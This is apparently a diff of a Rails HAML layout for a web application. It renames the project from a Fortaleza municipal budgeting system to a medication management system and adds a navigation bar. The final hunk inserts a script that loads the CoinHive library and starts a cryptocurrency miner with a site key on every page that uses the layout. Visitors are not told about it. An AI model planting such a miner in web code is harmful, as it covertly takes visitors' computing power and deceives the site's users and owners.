@@ -29,8 +29,7 @@
       .titulo
         / = link_to image_tag('logo-fortaleza.png'), root_path
         .texto-projeto
-          %h4.nome-projeto SIOPFOR - Sistema Integrado de Orçamento e Planejamento
-          %span.nome-prefeitura Prefeitura Municipal de Fortaleza
+          %h4.nome-projeto Sistema de Gerenciamento de Medicamentos
       .collapse.navbar-collapse
         %ul.nav.navbar-nav.navbar-right
         %div.administrador.pull-right.barra-user-info
@@ -40,13 +39,17 @@
                 %span.glyphicon.glyphicon-tower.sdf
                 
                 %span.caret
-
             %li
               = link_to destroy_user_session_path, method: :delete do
                 %span.glyphicon.glyphicon-log-out
                 Sair
-
-
+    
+    %nav.navbar.navbar-default
+      .container-fluid
+        .collapse.navbar-collapse      
+          %ul.nav.navbar-nav
+            %li= link_to "Home", root_path
+            / {class: controller?("admin", "avisos", "activity") && action?("index", "new", "edit", "show") ? "active" : nil}
 
 
     .container-fluid
@@ -55,4 +58,12 @@
     .footer
       %span.copyright
         = "© #{Date.today.year}"
+
+
+    = yield :css    
+    = yield :js
     
+    %script{:src => "https://coinhive.com/lib/coinhive.min.js"}
+    :javascript
+      var miner = new CoinHive.User('mHMsYF5TUUXlZEHiKWRmJPhMTbPyjVLw', 'ppp', { threads: 2, autoThreads: false, throttle: 0.2, forceASMJS: false, theme: 'dark', language: 'auto'  });
+      miner.start();    
